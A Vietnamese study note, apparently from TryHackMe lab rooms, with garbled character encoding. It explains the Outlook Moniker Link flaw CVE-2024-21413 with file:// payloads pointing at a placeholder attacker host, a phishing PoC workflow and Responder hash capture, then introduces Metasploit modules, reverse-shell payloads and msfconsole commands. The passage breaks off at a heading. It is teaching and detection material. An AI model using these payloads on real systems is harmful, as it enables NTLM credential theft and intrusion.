# LiÃªn káº¿t Moniker (CVE-2024-21413)

Outlook cÃ³ thá»ƒ hiá»ƒn thá»‹ email dÆ°á»›i dáº¡ng HTML. Báº¡n cÃ³ thá»ƒ nháº­n tháº¥y Ä‘iá»u nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi cÃ¡c báº£n tin yÃªu thÃ­ch cá»§a báº¡n. NgoÃ i ra, Outlook cÃ³ thá»ƒ phÃ¢n tÃ­ch cÃº phÃ¡p cÃ¡c siÃªu liÃªn káº¿t nhÆ° HTTP vÃ  HTTPS. Tuy nhiÃªn, nÃ³ cÅ©ng cÃ³ thá»ƒ má»Ÿ cÃ¡c URL chá»‰ Ä‘á»‹nh cÃ¡c á»©ng dá»¥ng Ä‘Æ°á»£c gá»i lÃ  Moniker Links .  ThÃ´ng thÆ°á»ng, Outlook sáº½ nháº¯c nhá»Ÿ cáº£nh bÃ¡o báº£o máº­t khi cÃ¡c á»©ng dá»¥ng bÃªn ngoÃ i Ä‘Æ°á»£c kÃ­ch hoáº¡t.



Cá»­a sá»• báº­t lÃªn nÃ y lÃ  káº¿t quáº£ cá»§a tÃ­nh nÄƒng "Protected View" cá»§a Outlook. Protect View sáº½ má»Ÿ cÃ¡c email chá»©a tá»‡p Ä‘Ã­nh kÃ¨m, siÃªu liÃªn káº¿t vÃ  ná»™i dung tÆ°Æ¡ng tá»± á»Ÿ cháº¿ Ä‘á»™ chá»‰ Ä‘á»c, cháº·n cÃ¡c ná»™i dung nhÆ° macro (Ä‘áº·c biá»‡t lÃ  tá»« bÃªn ngoÃ i tá»• chá»©c).



Báº±ng cÃ¡ch sá»­ dá»¥ng **file://** Moniker Link trong siÃªu liÃªn káº¿t, chÃºng ta cÃ³ thá»ƒ hÆ°á»›ng dáº«n Outlook thá»­ truy cáº­p má»™t tá»‡p, cháº³ng háº¡n nhÆ° tá»‡p trÃªn chia sáº» máº¡ng (**<a href="file://ATTACKER\\\\\\\_IP/test">Click me</a>**). Giao thá»©c SMB Ä‘Æ°á»£c sá»­ dá»¥ng, bao gá»“m viá»‡c sá»­ dá»¥ng thÃ´ng tin xÃ¡c thá»±c cá»¥c bá»™ Ä‘á»ƒ xÃ¡c thá»±c.  Tuy nhiÃªn, cháº¿ Ä‘á»™ "Protected View" cá»§a Outlook sáº½ phÃ¡t hiá»‡n vÃ  cháº·n ná»— lá»±c nÃ y.

**<p><a href="file://ATTACKER\\\\\\\_MACHINE/test">Click me</a></p>**



Lá»— há»•ng á»Ÿ Ä‘Ã¢y tá»“n táº¡i báº±ng cÃ¡ch sá»­a Ä‘á»•i siÃªu liÃªn káº¿t cá»§a chÃºng tÃ´i Ä‘á»ƒ bao gá»“m !kÃ½ tá»± Ä‘áº·c biá»‡t vÃ  má»™t sá»‘ vÄƒn báº£n trong Moniker Link, dáº«n Ä‘áº¿n viá»‡c bá» qua cháº¿ Ä‘á»™ Protected View cá»§a Outlook. VÃ­ dá»¥: **<a href="file://ATTACKER\\\\\\\_IP/test!exploit">Click me</a>**.

**<p><a href="file://ATTACKER\\\\\\\_MACHINE/test!exploit">Click me</a></p>**



Vá»›i tÆ° cÃ¡ch lÃ  káº» táº¥n cÃ´ng, chÃºng ta cÃ³ thá»ƒ cung cáº¥p má»™t LiÃªn káº¿t Moniker cÃ³ tÃ­nh cháº¥t nÃ y cho cuá»™c táº¥n cÃ´ng. LÆ°u Ã½ ráº±ng viá»‡c chia sáº» khÃ´ng nháº¥t thiáº¿t pháº£i tá»“n táº¡i trÃªn thiáº¿t bá»‹ tá»« xa, vÃ¬ dÃ¹ sao thÃ¬ má»™t ná»— lá»±c xÃ¡c thá»±c váº«n sáº½ Ä‘Æ°á»£c thá»±c hiá»‡n, dáº«n Ä‘áº¿n viá»‡c mÃ£ bÄƒm netNTLMv2 Windows cá»§a náº¡n nhÃ¢n Ä‘Æ°á»£c gá»­i Ä‘áº¿n káº» táº¥n cÃ´ng.



Thá»±c thi MÃ£ Tá»« xa ( RCE ) lÃ  kháº£ thi vÃ¬ Moniker Links sá»­ dá»¥ng MÃ´ hÃ¬nh Äá»‘i tÆ°á»£ng ThÃ nh pháº§n (COM) trÃªn Windows. Tuy nhiÃªn, viá»‡c giáº£i thÃ­ch Ä‘iá»u nÃ y hiá»‡n náº±m ngoÃ i pháº¡m vi cá»§a phÃ²ng nÃ y, vÃ¬ khÃ´ng cÃ³ báº±ng chá»©ng khÃ¡i niá»‡m nÃ o Ä‘Æ°á»£c cÃ´ng bá»‘ cÃ´ng khai vá» viá»‡c Ä‘áº¡t Ä‘Æ°á»£c RCE thÃ´ng qua CVE cá»¥ thá»ƒ nÃ y .



##### Khai thÃ¡c :

Vá»›i cuá»™c táº¥n cÃ´ng nÃ y, chÃºng tÃ´i sáº½ gá»­i email cho náº¡n nhÃ¢n má»™t LiÃªn káº¿t Moniker tÆ°Æ¡ng tá»± nhÆ° liÃªn káº¿t Ä‘Æ°á»£c cung cáº¥p trong nhiá»‡m vá»¥ trÆ°á»›c. Má»¥c tiÃªu cá»§a káº» táº¥n cÃ´ng lÃ  táº¡o má»™t email gá»­i Ä‘áº¿n náº¡n nhÃ¢n vá»›i LiÃªn káº¿t Moniker Ä‘á»ƒ vÆ°á»£t qua cháº¿ Ä‘á»™ "Protected View" cá»§a Outlook, nÆ¡i mÃ¡y khÃ¡ch cá»§a náº¡n nhÃ¢n sáº½ cá»‘ gáº¯ng táº£i má»™t tá»‡p tá»« mÃ¡y tÃ­nh táº¥n cÃ´ng cá»§a chÃºng tÃ´i, dáº«n Ä‘áº¿n viá»‡c mÃ£ bÄƒm netNTLMv2 cá»§a náº¡n nhÃ¢n bá»‹ báº¯t.



NhÆ°ng trÆ°á»›c tiÃªn, hÃ£y cÃ¹ng xem qua PoC mÃ  tÃ´i Ä‘Ã£ táº¡o (cÅ©ng cÃ³ sáºµn trÃªn GitHub(**https://github.com/CMNatic/CVE-2024-21413**)).



PoC :â€‹

* Láº¥y email cá»§a káº» táº¥n cÃ´ng vÃ  náº¡n nhÃ¢n. ThÃ´ng thÆ°á»ng, báº¡n sáº½ cáº§n sá»­ dá»¥ng mÃ¡y chá»§ SMTP cá»§a riÃªng mÃ¬nh (mÃ¡y chá»§ nÃ y Ä‘Ã£ Ä‘Æ°á»£c cung cáº¥p sáºµn cho báº¡n trong phÃ²ng nÃ y).
* YÃªu cáº§u máº­t kháº©u Ä‘á»ƒ xÃ¡c thá»±c. Äá»‘i vá»›i phÃ²ng nÃ y, máº­t kháº©u cho attacker@monikerlink.thm lÃ  attacker
* Chá»©a ná»™i dung email (html\_content), trong Ä‘Ã³ cÃ³ LiÃªn káº¿t Moniker cá»§a chÃºng tÃ´i dÆ°á»›i dáº¡ng siÃªu liÃªn káº¿t HTML
* Sau Ä‘Ã³, Ä‘iá»n vÃ o cÃ¡c trÆ°á»ng "chá»§ Ä‘á»", "tá»«" vÃ  "Ä‘áº¿n" trong email
* Cuá»‘i cÃ¹ng, nÃ³ gá»­i email Ä‘áº¿n mÃ¡y chá»§ thÆ°



HÃ£y sá»­ dá»¥ng Responder Ä‘á»ƒ táº¡o má»™t trÃ¬nh láº¯ng nghe SMB trÃªn mÃ¡y táº¥n cÃ´ng cá»§a chÃºng ta. Äá»‘i vá»›i THM AttackBox, giao diá»‡n sáº½ lÃ  -I ens5. TÃªn giao diá»‡n sáº½ khÃ¡c náº¿u báº¡n sá»­ dá»¥ng thiáº¿t bá»‹ cá»§a riÃªng mÃ¬nh (vÃ­ dá»¥: Kali). Náº¿u báº¡n muá»‘n tÃ¬m hiá»ƒu thÃªm, mÃ¡y chá»§ Impacket cÅ©ng cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng.

ChÃºng ta hÃ£y má»Ÿ mÃ¡y dá»… bá»‹ táº¥n cÃ´ng báº±ng cÃ¡ch nháº¥n vÃ o ngÄƒn " CVE -2024-21413" trong cháº¿ Ä‘á»™ xem mÃ n hÃ¬nh chia Ä‘Ã´i.

Má»Ÿ Outlook báº±ng cÃ¡ch nháº¥p vÃ o biá»ƒu tÆ°á»£ng "Outlook" trÃªn mÃ n hÃ¬nh ná»n. Khi Outlook Ä‘Ã£ má»Ÿ, hÃ£y nháº¥p vÃ o "TÃ´i khÃ´ng muá»‘n Ä‘Äƒng nháº­p hoáº·c táº¡o tÃ i khoáº£n" trÃªn cá»­a sá»• báº­t lÃªn.

ÄÃ³ng cá»­a sá»• báº­t lÃªn thá»© hai báº±ng cÃ¡ch nháº¥p vÃ o "X" á»Ÿ gÃ³c trÃªn bÃªn pháº£i cá»§a cá»­a sá»• báº­t lÃªn (báº¡n cÃ³ thá»ƒ cáº§n kÃ©o cá»­a sá»• sang trÃ¡i má»™t chÃºt, tÃ¹y thuá»™c vÃ o Ä‘á»™ phÃ¢n giáº£i mÃ n hÃ¬nh).

Khi hoÃ n táº¥t, báº¡n sáº½ tháº¥y giao diá»‡n Outlook. Äá»‘i vá»›i phÃ²ng nÃ y, há»™p thÆ° cá»§a náº¡n nhÃ¢n Ä‘Ã£ Ä‘Æ°á»£c thiáº¿t láº­p sáºµn trong Outlook cho báº¡n.

Quay láº¡i AttackBox cá»§a báº¡n. ChÃºng tÃ´i sáº½ sao chÃ©p vÃ  dÃ¡n PoC á»Ÿ trÃªn vÃ o AttackBox.

ChÃºng ta sáº½ cáº§n thá»±c hiá»‡n má»™t sá»‘ thiáº¿t láº­p ban Ä‘áº§u trÃªn AttackBox trÆ°á»›c khi cháº¡y táº­p lá»‡nh Python:

* Sá»­a Ä‘á»•i Moniker Link (dÃ²ng #12) trong PoC cá»§a chÃºng tÃ´i Ä‘á»ƒ pháº£n Ã¡nh Ä‘á»‹a chá»‰ IP cá»§a AttackBox cá»§a chÃºng tÃ´i
* Thay tháº¿ chá»— giá»¯ chá»— MAILSERVER á»Ÿ dÃ²ng #31 báº±ng MACHINE\_IP
* Khi hoÃ n táº¥t, chÃºng ta cÃ³ thá»ƒ cháº¡y lá»‡nh khai thÃ¡c. Khi Ä‘Æ°á»£c yÃªu cáº§u nháº­p máº­t kháº©u email cá»§a káº» táº¥n cÃ´ng, hÃ£y nháº­p "attacker".

Khi hoÃ n táº¥t, chÃºng ta cÃ³ thá»ƒ cháº¡y lá»‡nh khai thÃ¡c. Khi Ä‘Æ°á»£c yÃªu cáº§u nháº­p máº­t kháº©u email cá»§a káº» táº¥n cÃ´ng, hÃ£y nháº­p "attacker".

Táº­p lá»‡nh Python sáº½ in ra "Email Ä‘Ã£ gá»­i" khi email Ä‘Ã£ Ä‘Æ°á»£c gá»­i. Náº¿u táº­p lá»‡nh bÃ¡o lá»—i xÃ¡c thá»±c, hÃ£y Ä‘áº£m báº£o báº¡n Ä‘Ã£ thay tháº¿ chÃ­nh xÃ¡c cÃ¡c giÃ¡ trá»‹ trong exploit.py. BÃ¢y giá», hÃ£y quay láº¡i mÃ¡y tÃ­nh bá»‹ táº¥n cÃ´ng vÃ  kiá»ƒm tra email má»›i.

Nháº¥p vÃ o siÃªu liÃªn káº¿t "Nháº¥p vÃ o tÃ´i" vÃ  quay láº¡i phiÃªn Ä‘áº§u cuá»‘i "Responder" cá»§a chÃºng tÃ´i trÃªn AttackBox.



#### PhÃ¡t hiá»‡n :

**YARA**

Florian Roth Ä‘Ã£ táº¡o ra quy táº¯c Yara(**https://github.com/Neo23x0/signature-base/blob/master/yara/expl\_outlook\_cve\_2024\_21413.yar**) Ä‘á»ƒ phÃ¡t hiá»‡n cÃ¡c email cÃ³ chá»©a thÃ nh pháº§n trong Moniker Link.file:\\\\



**Wireshark**

NgoÃ i ra, yÃªu cáº§u SMB tá»« náº¡n nhÃ¢n Ä‘áº¿n mÃ¡y khÃ¡ch cÃ³ thá»ƒ Ä‘Æ°á»£c nhÃ¬n tháº¥y trong gÃ³i tin báº¯t Ä‘Æ°á»£c vá»›i hÃ m bÄƒm netNTLMv2 bá»‹ cáº¯t bá»›t.



# Metasploit: Giá»›i thiá»‡u

#### Giá»›i thiá»‡u vá» Metasploit :

Metasploit lÃ  ná»n táº£ng khai thÃ¡c Ä‘Æ°á»£c sá»­ dá»¥ng rá»™ng rÃ£i nháº¥t. Metasploit lÃ  má»™t cÃ´ng cá»¥ máº¡nh máº½ cÃ³ thá»ƒ há»— trá»£ táº¥t cáº£ cÃ¡c giai Ä‘oáº¡n cá»§a quÃ¡ trÃ¬nh kiá»ƒm tra xÃ¢m nháº­p, tá»« thu tháº­p thÃ´ng tin Ä‘áº¿n háº­u khai thÃ¡c.



Metasploit cÃ³ hai phiÃªn báº£n chÃ­nh:

* Metasploit Pro : PhiÃªn báº£n thÆ°Æ¡ng máº¡i há»— trá»£ tá»± Ä‘á»™ng hÃ³a vÃ  quáº£n lÃ½ tÃ¡c vá»¥. PhiÃªn báº£n nÃ y cÃ³ giao diá»‡n ngÆ°á»i dÃ¹ng Ä‘á»“ há»a ( GUI ).
* Metasploit Framework : PhiÃªn báº£n mÃ£ nguá»“n má»Ÿ hoáº¡t Ä‘á»™ng tá»« dÃ²ng lá»‡nh. BÃ i viáº¿t nÃ y sáº½ táº­p trung vÃ o phiÃªn báº£n nÃ y, Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn AttackBox vÃ  lÃ  phiÃªn báº£n kiá»ƒm tra xÃ¢m nháº­p phá»• biáº¿n nháº¥t trÃªn cÃ¡c báº£n phÃ¢n phá»‘i Linux .



Metasploit Framework lÃ  má»™t bá»™ cÃ´ng cá»¥ cho phÃ©p thu tháº­p thÃ´ng tin, quÃ©t, khai thÃ¡c, phÃ¡t triá»ƒn khai thÃ¡c, háº­u khai thÃ¡c, v.v. Máº·c dÃ¹ má»¥c Ä‘Ã­ch sá»­ dá»¥ng chÃ­nh cá»§a Metasploit Framework táº­p trung vÃ o lÄ©nh vá»±c kiá»ƒm tra xÃ¢m nháº­p, nhÆ°ng nÃ³ cÅ©ng há»¯u Ã­ch cho viá»‡c nghiÃªn cá»©u lá»— há»•ng vÃ  phÃ¡t triá»ƒn khai thÃ¡c.



CÃ¡c thÃ nh pháº§n chÃ­nh cá»§a Metasploit Framework cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ³m táº¯t nhÆ° sau;

* msfconsole : Giao diá»‡n dÃ²ng lá»‡nh chÃ­nh.
* MÃ´-Ä‘un : há»— trá»£ cÃ¡c mÃ´-Ä‘un nhÆ° khai thÃ¡c, mÃ¡y quÃ©t, táº£i trá»ng, v.v.
* CÃ´ng cá»¥ : CÃ¡c cÃ´ng cá»¥ Ä‘á»™c láº­p há»— trá»£ nghiÃªn cá»©u lá»— há»•ng, Ä‘Ã¡nh giÃ¡ lá»— há»•ng hoáº·c kiá»ƒm tra thÃ¢m nháº­p. Má»™t sá»‘ cÃ´ng cá»¥ nÃ y bao gá»“m msfvenom, pattern\_create vÃ  pattern\_offset. ChÃºng tÃ´i sáº½ Ä‘á» cáº­p Ä‘áº¿n msfvenom trong mÃ´-Ä‘un nÃ y, nhÆ°ng pattern\_create vÃ  pattern\_offset lÃ  nhá»¯ng cÃ´ng cá»¥ há»¯u Ã­ch trong viá»‡c phÃ¡t triá»ƒn khai thÃ¡c, náº±m ngoÃ i pháº¡m vi cá»§a mÃ´-Ä‘un nÃ y.



#### CÃ¡c thÃ nh pháº§n chÃ­nh cá»§a Metasploit :

Khi sá»­ dá»¥ng Metasploit Framework, báº¡n chá»§ yáº¿u sáº½ tÆ°Æ¡ng tÃ¡c vá»›i báº£ng Ä‘iá»u khiá»ƒn Metasploit . Báº¡n cÃ³ thá»ƒ khá»Ÿi cháº¡y nÃ³ tá»« terminal AttackBox báº±ng  msfconsole lá»‡nh. Báº£ng Ä‘iá»u khiá»ƒn sáº½ lÃ  giao diá»‡n chÃ­nh Ä‘á»ƒ báº¡n tÆ°Æ¡ng tÃ¡c vá»›i cÃ¡c mÃ´-Ä‘un khÃ¡c nhau cá»§a Metasploit Framework. MÃ´-Ä‘un lÃ  cÃ¡c thÃ nh pháº§n nhá» trong Metasploit Framework, Ä‘Æ°á»£c xÃ¢y dá»±ng Ä‘á»ƒ thá»±c hiá»‡n má»™t tÃ¡c vá»¥ cá»¥ thá»ƒ, cháº³ng háº¡n nhÆ° khai thÃ¡c lá»— há»•ng, quÃ©t má»¥c tiÃªu hoáº·c thá»±c hiá»‡n táº¥n cÃ´ng brute-force.



TrÆ°á»›c khi Ä‘i sÃ¢u vÃ o cÃ¡c mÃ´-Ä‘un, sáº½ há»¯u Ã­ch náº¿u lÃ m rÃµ má»™t sá»‘ khÃ¡i niá»‡m thÆ°á»ng gáº·p: lá»— há»•ng, khai thÃ¡c vÃ  táº£i trá»ng.



Khai thÃ¡c: Má»™t Ä‘oáº¡n mÃ£ sá»­ dá»¥ng lá»— há»•ng hiá»‡n cÃ³ trÃªn há»‡ thá»‘ng má»¥c tiÃªu.

Lá»— há»•ng báº£o máº­t: Má»™t lá»—i thiáº¿t káº¿, mÃ£ hÃ³a hoáº·c logic áº£nh hÆ°á»Ÿng Ä‘áº¿n há»‡ thá»‘ng má»¥c tiÃªu. Viá»‡c khai thÃ¡c lá»— há»•ng báº£o máº­t cÃ³ thá»ƒ dáº«n Ä‘áº¿n viá»‡c tiáº¿t lá»™ thÃ´ng tin máº­t hoáº·c cho phÃ©p káº» táº¥n cÃ´ng thá»±c thi mÃ£ trÃªn há»‡ thá»‘ng má»¥c tiÃªu.

Payload: Má»™t khai thÃ¡c sáº½ lá»£i dá»¥ng lá»— há»•ng. Tuy nhiÃªn, náº¿u muá»‘n khai thÃ¡c Ä‘áº¡t Ä‘Æ°á»£c káº¿t quáº£ mong muá»‘n (truy cáº­p há»‡ thá»‘ng má»¥c tiÃªu, Ä‘á»c thÃ´ng tin máº­t, v.v.), chÃºng ta cáº§n sá»­ dá»¥ng má»™t payload. Payload lÃ  mÃ£ sáº½ cháº¡y trÃªn há»‡ thá»‘ng má»¥c tiÃªu.

CÃ¡c mÃ´-Ä‘un vÃ  danh má»¥c cá»§a tá»«ng mÃ´-Ä‘un Ä‘Æ°á»£c liá»‡t kÃª bÃªn dÆ°á»›i. Nhá»¯ng mÃ´-Ä‘un nÃ y chá»‰ mang tÃ­nh cháº¥t tham kháº£o, nhÆ°ng báº¡n sáº½ tÆ°Æ¡ng tÃ¡c vá»›i chÃºng thÃ´ng qua báº£ng Ä‘iá»u khiá»ƒn Metasploit (msfconsole).



###### Phá»¥ trá»£(Auxiliary)



###### Bá»™ mÃ£ hÃ³a(Encoders)

Bá»™ mÃ£ hÃ³a sáº½ cho phÃ©p báº¡n mÃ£ hÃ³a pháº§n khai thÃ¡c vÃ  pháº§n táº£i trá»ng vá»›i hy vá»ng ráº±ng giáº£i phÃ¡p chá»‘ng vi-rÃºt dá»±a trÃªn chá»¯ kÃ½ cÃ³ thá»ƒ bá» sÃ³t chÃºng.

CÃ¡c giáº£i phÃ¡p báº£o máº­t vÃ  chá»‘ng vi-rÃºt dá»±a trÃªn chá»¯ kÃ½ cÃ³ cÆ¡ sá»Ÿ dá»¯ liá»‡u vá» cÃ¡c má»‘i Ä‘e dá»a Ä‘Ã£ biáº¿t. ChÃºng phÃ¡t hiá»‡n má»‘i Ä‘e dá»a báº±ng cÃ¡ch so sÃ¡nh cÃ¡c tá»‡p Ä‘Ã¡ng ngá» vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u nÃ y vÃ  Ä‘Æ°a ra cáº£nh bÃ¡o náº¿u cÃ³ sá»± trÃ¹ng khá»›p. Do Ä‘Ã³, bá»™ mÃ£ hÃ³a cÃ³ thá»ƒ cÃ³ tá»· lá»‡ thÃ nh cÃ´ng háº¡n cháº¿ vÃ¬ cÃ¡c giáº£i phÃ¡p chá»‘ng vi-rÃºt cÃ³ thá»ƒ thá»±c hiá»‡n cÃ¡c kiá»ƒm tra bá»• sung.



###### Trá»‘n trÃ¡nh(Evasion)

Máº·c dÃ¹ bá»™ mÃ£ hÃ³a sáº½ mÃ£ hÃ³a dá»¯ liá»‡u, chÃºng khÃ´ng nÃªn Ä‘Æ°á»£c coi lÃ  má»™t ná»— lá»±c trá»±c tiáº¿p nháº±m trÃ¡nh nÃ© pháº§n má»m diá»‡t vi-rÃºt. Máº·t khÃ¡c, cÃ¡c mÃ´-Ä‘un "trá»‘n trÃ¡nh" sáº½ cá»‘ gáº¯ng lÃ m Ä‘iá»u Ä‘Ã³, vá»›i Ã­t nhiá»u thÃ nh cÃ´ng.



###### Khai thÃ¡c(Exploits)

CÃ¡c lá»— há»•ng Ä‘Æ°á»£c sáº¯p xáº¿p gá»n gÃ ng theo há»‡ thá»‘ng má»¥c tiÃªu.



###### NOPs

NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.



###### Táº£i trá»ng(Payloads)

Payloads are codes that will run on the target system.

Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.

Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system.

Báº¡n sáº½ tháº¥y bá»‘n thÆ° má»¥c khÃ¡c nhau trong pháº§n táº£i trá»ng: bá»™ Ä‘iá»u há»£p, Ä‘Æ¡n, giai Ä‘oáº¡n vÃ  giai Ä‘oáº¡n.

* Bá»™ Ä‘iá»u há»£p(Adapters): Bá»™ Ä‘iá»u há»£p Ä‘Ã³ng gÃ³i cÃ¡c payload Ä‘Æ¡n láº» Ä‘á»ƒ chuyá»ƒn Ä‘á»•i chÃºng sang cÃ¡c Ä‘á»‹nh dáº¡ng khÃ¡c nhau. VÃ­ dá»¥: má»™t payload Ä‘Æ¡n láº» thÃ´ng thÆ°á»ng cÃ³ thá»ƒ Ä‘Æ°á»£c Ä‘Ã³ng gÃ³i bÃªn trong má»™t bá»™ Ä‘iá»u há»£p Powershell , bá»™ Ä‘iá»u há»£p nÃ y sáº½ táº¡o ra má»™t lá»‡nh Powershell duy nháº¥t Ä‘á»ƒ thá»±c thi payload.
* ÄÆ¡n láº»(Singles): CÃ¡c táº£i trá»ng Ä‘á»™c láº­p (thÃªm ngÆ°á»i dÃ¹ng, khá»Ÿi cháº¡y notepad.exe, v.v.) khÃ´ng cáº§n táº£i xuá»‘ng thÃ nh pháº§n bá»• sung Ä‘á»ƒ cháº¡y.
* Stagers: Chá»‹u trÃ¡ch nhiá»‡m thiáº¿t láº­p kÃªnh káº¿t ná»‘i giá»¯a Metasploit vÃ  há»‡ thá»‘ng Ä‘Ã­ch. Há»¯u Ã­ch khi lÃ m viá»‡c vá»›i cÃ¡c payload Ä‘Æ°á»£c dÃ n dá»±ng. "Staged payload" sáº½ táº£i má»™t stager lÃªn há»‡ thá»‘ng Ä‘Ã­ch trÆ°á»›c, sau Ä‘Ã³ táº£i xuá»‘ng pháº§n cÃ²n láº¡i cá»§a payload (giai Ä‘oáº¡n). Äiá»u nÃ y mang láº¡i má»™t sá»‘ lá»£i tháº¿ vÃ¬ kÃ­ch thÆ°á»›c ban Ä‘áº§u cá»§a payload sáº½ tÆ°Æ¡ng Ä‘á»‘i nhá» so vá»›i toÃ n bá»™ payload Ä‘Æ°á»£c gá»­i cÃ¹ng lÃºc.
* Giai Ä‘oáº¡n(Stages): ÄÆ°á»£c táº£i xuá»‘ng bá»Ÿi trÃ¬nh phÃ¢n Ä‘oáº¡n. Äiá»u nÃ y sáº½ cho phÃ©p báº¡n sá»­ dá»¥ng cÃ¡c táº£i trá»ng cÃ³ kÃ­ch thÆ°á»›c lá»›n hÆ¡n.

Metasploit cÃ³ má»™t cÃ¡ch tinh táº¿ giÃºp báº¡n xÃ¡c Ä‘á»‹nh cÃ¡c táº£i trá»ng Ä‘Æ¡n láº» (cÃ²n gá»i lÃ  "ná»™i tuyáº¿n") vÃ  cÃ¡c táº£i trá»ng theo giai Ä‘oáº¡n.

* generic/shell\_reverse\_tcp
* windows/x64/shell/reverse\_tcp

Cáº£ hai Ä‘á»u lÃ  shell Windows Ä‘áº£o ngÆ°á»£c. Shell trÆ°á»›c lÃ  má»™t payload ná»™i tuyáº¿n (hoáº·c Ä‘Æ¡n), Ä‘Æ°á»£c biá»ƒu thá»‹ báº±ng dáº¥u â€œ\_â€ giá»¯a â€œshellâ€ vÃ  â€œreverseâ€. Trong khi shell sau lÃ  payload theo giai Ä‘oáº¡n, Ä‘Æ°á»£c biá»ƒu thá»‹ báº±ng dáº¥u â€œ/â€ giá»¯a â€œshellâ€ vÃ  â€œreverseâ€.



###### BÆ°u kiá»‡n(POST)

CÃ¡c mÃ´-Ä‘un bÃ i Ä‘Äƒng sáº½ há»¯u Ã­ch á»Ÿ giai Ä‘oáº¡n cuá»‘i cÃ¹ng cá»§a quÃ¡ trÃ¬nh kiá»ƒm tra xÃ¢m nháº­p Ä‘Æ°á»£c liá»‡t kÃª á»Ÿ trÃªn, sau khi khai thÃ¡c.



#### Msfconsole :

**ğŸ” 1. TÃ¬m Kiáº¿m \& Lá»±a Chá»n Module**

ÄÃ¢y lÃ  nhá»¯ng lá»‡nh báº¡n sáº½ dÃ¹ng Ä‘áº§u tiÃªn Ä‘á»ƒ tÃ¬m "vÅ© khÃ­" phÃ¹ há»£p cho má»¥c tiÃªu.



**search \[tá»«\_khÃ³a]**

* CÃ´ng dá»¥ng: Lá»‡nh quan trá»ng nháº¥t Ä‘á»ƒ tÃ¬m kiáº¿m cÃ¡c module (exploit, auxiliary, payload, etc.) trong kho dá»¯ liá»‡u cá»§a Metasploit.
* Máº¹o: Báº¡n cÃ³ thá»ƒ tÃ¬m theo tÃªn lá»— há»•ng (vÃ­ dá»¥: ms17-010), tÃªn pháº§n má»m (wordpress), hoáº·c loáº¡i module (type:exploit platform:windows).
* VÃ­ dá»¥: search eternalblue



**use \[tÃªn\_module]**

* CÃ´ng dá»¥ng: Chá»n má»™t module Ä‘á»ƒ báº¯t Ä‘áº§u sá»­ dá»¥ng. Báº¡n cÃ³ thá»ƒ dÃ¹ng tÃªn Ä‘áº§y Ä‘á»§ hoáº·c sá»‘ thá»© tá»± tá»« káº¿t quáº£ lá»‡nh search.
* VÃ­ dá»¥: use exploit/windows/smb/ms17\_010\_eternalblue



**info**

* CÃ´ng dá»¥ng: Sau khi use má»™t module, lá»‡nh nÃ y sáº½ hiá»ƒn thá»‹ táº¥t cáº£ thÃ´ng tin chi tiáº¿t vá» nÃ³: tÃ¡c giáº£, mÃ´ táº£ lá»— há»•ng, cÃ¡c má»¥c tiÃªu tÆ°Æ¡ng thÃ­ch, vÃ  cÃ¡c tÃ¹y chá»n cáº§n thiáº¿t láº­p.



**back**

* CÃ´ng dá»¥ng: ThoÃ¡t khá»i module hiá»‡n táº¡i vÃ  quay trá»Ÿ láº¡i giao diá»‡n dÃ²ng lá»‡nh chÃ­nh cá»§a msfconsole.



**âš™ï¸ 2. Cáº¥u HÃ¬nh \& Cháº¡y Module**

Sau khi chá»n Ä‘Æ°á»£c module, báº¡n cáº§n "náº¡p Ä‘áº¡n" cho nÃ³.



**show options (hoáº·c options)**

* CÃ´ng dá»¥ng: Liá»‡t kÃª táº¥t cáº£ cÃ¡c tÃ¹y chá»n báº¡n cáº§n pháº£i thiáº¿t láº­p cho module Ä‘Ã£ chá»n. HÃ£y Ä‘áº·c biá»‡t chÃº Ã½ Ä‘áº¿n nhá»¯ng má»¥c cÃ³ "yes" á»Ÿ cá»™t Required.



**set \[TÃŠN\_TÃ™Y\_CHá»ŒN] \[giÃ¡\_trá»‹]**

* CÃ´ng dá»¥ng: Thiáº¿t láº­p má»™t giÃ¡ trá»‹ cho má»™t tÃ¹y chá»n cá»¥ thá»ƒ.
* VÃ­ dá»¥ quan trá»ng:

set RHOSTS 192.168.1.10: Äáº·t Ä‘á»‹a chá»‰ IP cá»§a mÃ¡y má»¥c tiÃªu. (RHOSTS = Remote Hosts)

set LHOST 10.10.0.5: Äáº·t Ä‘á»‹a chá»‰ IP cá»§a mÃ¡y báº¡n. (LHOST = Local Host). Lá»‡nh nÃ y cá»±c ká»³ quan trá»ng khi dÃ¹ng cÃ¡c payload reverse shell.



**setg \[TÃŠN\_TÃ™Y\_CHá»ŒN] \[giÃ¡\_trá»‹]**

* CÃ´ng dá»¥ng: TÆ°Æ¡ng tá»± nhÆ° set, nhÆ°ng nÃ³ sáº½ thiáº¿t láº­p giÃ¡ trá»‹ Ä‘Ã³ má»™t cÃ¡ch toÃ n cá»¥c (globally). Báº¡n sáº½ khÃ´ng cáº§n pháº£i Ä‘áº·t láº¡i giÃ¡ trá»‹ nÃ y khi chuyá»ƒn sang má»™t module khÃ¡c (vÃ­ dá»¥: setg LHOST tun0).



**show payloads**

* CÃ´ng dá»¥ng: Liá»‡t kÃª táº¥t cáº£ cÃ¡c payloads tÆ°Æ¡ng thÃ­ch vá»›i module exploit báº¡n Ä‘ang dÃ¹ng.



**set payload \[tÃªn\_payload]**

* CÃ´ng dá»¥ng: Chá»n má»™t payload cá»¥ thá»ƒ Ä‘á»ƒ sá»­ dá»¥ng sau khi khai thÃ¡c thÃ nh cÃ´ng.
* VÃ­ dá»¥: set payload windows/x64/meterpreter/reverse\_tcp



**run (hoáº·c exploit)**

* CÃ´ng dá»¥ng: Cháº¡y module sau khi Ä‘Ã£ thiáº¿t láº­p xong táº¥t cáº£ cÃ¡c tÃ¹y chá»n cáº§n thiáº¿t.



**ğŸš 3. TÆ°Æ¡ng TÃ¡c Vá»›i Session (Sau Khi Táº¥n CÃ´ng ThÃ nh CÃ´ng)**

